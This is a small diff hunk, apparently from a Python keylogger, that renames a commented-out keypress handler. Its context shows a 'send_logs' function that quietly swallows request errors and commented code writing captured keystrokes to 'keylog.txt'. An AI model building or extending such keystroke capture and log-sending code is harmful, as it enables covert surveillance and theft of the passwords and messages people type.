@@ -13,7 +13,7 @@ def send_logs():
     except requests.RequestException:
         pass
 
-# def on_press(key):
+# def on_press_single(key):
 #     try:
 #         with open("keylog.txt", "a") as f:
 #             f.write(str(key.char))
